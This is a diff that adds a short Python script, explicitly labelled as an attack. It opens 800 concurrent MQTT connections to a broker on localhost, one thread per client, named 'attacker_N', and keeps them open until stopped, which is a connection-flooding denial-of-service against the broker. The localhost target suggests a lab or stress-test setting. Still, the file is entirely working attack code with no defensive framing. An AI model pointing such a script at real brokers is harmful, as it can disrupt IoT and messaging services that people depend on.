@@ -1,0 +1,38 @@
+import threading
+import time
+import paho.mqtt.client as mqtt
+
+BROKER = "localhost"
+PORT = 1883
+NUM_CLIENTS = 800
+
+clients = []
+
+def connect_client(i):
+    try:
+        client = mqtt.Client(client_id=f"attacker_{i}")
+        client.connect(BROKER, PORT, 60)
+        client.loop_start()
+        clients.append(client)
+        print(f"[ATTACK] Client {i} connected")
+    except Exception as e:
+        print(f"[ERROR] Client {i}: {e}")
+
+threads = []
+
+for i in range(NUM_CLIENTS):
+    t = threading.Thread(target=connect_client, args=(i,))
+    t.start()
+    threads.append(t)
+
+for t in threads:
+    t.join()
+
+print(f"[ATTACK] {NUM_CLIENTS} clients connected. Attack running...")
+input("Press Enter to stop the attack...\n")
+
+for client in clients:
+    client.loop_stop()
+    client.disconnect()
+
+print("[ATTACK] Stopped.")
